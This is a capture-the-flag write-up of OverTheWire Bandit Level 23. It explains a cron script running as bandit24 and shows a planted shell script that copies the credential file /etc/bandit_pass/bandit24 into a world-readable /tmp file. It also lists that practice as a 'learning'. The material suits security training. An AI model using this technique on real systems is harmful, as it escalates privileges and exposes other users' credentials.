# OverTheWire Bandit: Level 23 → Level 24

This document details the challenge, the steps taken, and the key learnings from completing Bandit Level 23.

## Problem Statement

Bandit Level 23's goal was to find the password for Bandit 24. This involved a program scheduled by `cron`, requiring investigation of the `cron` configuration in `/etc/cron.d/` to identify the executed command. The level noted that a self-removed shell script was required.

## My Attempts

My process involved analyzing the `cron` job and its executed script, then crafting my own script to achieve the objective.

1.  **Locating `cron` Configuration:**
    I navigated to `/etc/cron.d/` and listed its contents, identifying `cronjob_bandit24`.

2.  **Analyzing `cronjob_bandit24`:**
    Reading `cronjob_bandit24` revealed:

    ```bash
    @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
    ```

    This indicated that `/usr/bin/cronjob_bandit24.sh` runs every minute (and on reboot) as the `bandit24` user.

3.  **Analyzing `/usr/bin/cronjob_bandit24.sh`:**
    I then read the script `/usr/bin/cronjob_bandit24.sh`:

    ```bash
    #!/bin/bash

    myname=$(whoami)

    cd /var/spool/$myname/foo
    echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
    for i in * .*;
    do
        if [ "$i" != "." -a "$i" != ".." ];
        then
            echo "Handling $i"
            owner="$(stat --format "%U" ./$i)"
            if [ "${owner}" = "bandit23" ]; then
                timeout -s 9 60 ./$i
            fi
            rm -f ./$i
        fi
    done
    ```

    This script changes directory to `/var/spool/bandit24/foo` (as `myname` would be `bandit24` during cron execution). It then iterates through files in that directory, executing any owned by `bandit23` (my current user) with a 60-second timeout, and finally deleting them.

4.  **Creating and Preparing My Script:**
    I navigated to `/var/spool/bandit24/foo` and created a new file named `script.sh` using `vim` with the following content:

    ```bash
    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/tempbandit24passfile123
    chmod 755 /tmp/tempbandit24passfile123
    ```

    This script aimed to copy the `bandit24` password to a world-readable file in `/tmp/` before it gets deleted. After saving, I made it executable:

    ```bash
    chmod 755 script.sh
    ```

## The Correct Solution

The correct solution involved creating and preparing my script, then waiting for the `cron` job to execute it, which exposed the password.

1.  **Creating and Preparing My Script:**
    As detailed in "My Attempts," I created the `script.sh` in `/var/spool/bandit24/foo` with the following content:

    ```bash
    #!/bin/bash

    cat /etc/bandit_pass/bandit24 > /tmp/tempbandit24passfile123
    chmod 755 /tmp/tempbandit24passfile123
    ```

    And made it executable:

    ```bash
    chmod 755 script.sh
    ```

2.  **Waiting for `cron` Job Execution:**
    After creating and setting permissions on `script.sh`, I waited for approximately one minute for the `cron` job (`cronjob_bandit24.sh`) to run. During its execution, it identified `script.sh` (owned by `bandit23`), executed it, and then deleted it.

3.  **Retrieving the Password:**
    My `script.sh` successfully copied the `bandit24` password to `/tmp/tempbandit24passfile123` and set its permissions. I then simply read this file:

    ```bash
    cat /tmp/tempbandit24passfile123
    ```

    This command successfully displayed the password for Bandit Level 24.

## What I Learned

- **Automated Script Execution & Cleanup:** Understood how `cron` jobs can execute user-provided scripts and how those scripts can include cleanup (deletion) mechanisms.

- **Privilege Delegation via `cron` and Ownership:** Learned how a `cron` job running as a higher-privileged user (`bandit24`) can be leveraged to execute a script owned by a lower-privileged user (`bandit23`), effectively delegating a specific task.

- **Shell Scripting Logic (`for` loop, `stat`, `timeout`, `rm`):** Gained practical experience analyzing a more complex shell script, including loop constructs, file ownership checks (`stat --format "%U"`), timed execution (`timeout`), and file removal (`rm -f`).

- **Temporary File Persistence:** Confirmed the strategy of writing passwords to temporary, world-readable files in `/tmp/` for retrieval before they are cleaned up.

- **Importance of `chmod` for Execution:** Reaffirmed the necessity of setting execute permissions (`chmod +x` or `chmod 755`) on a script for it to be run directly by the shell.
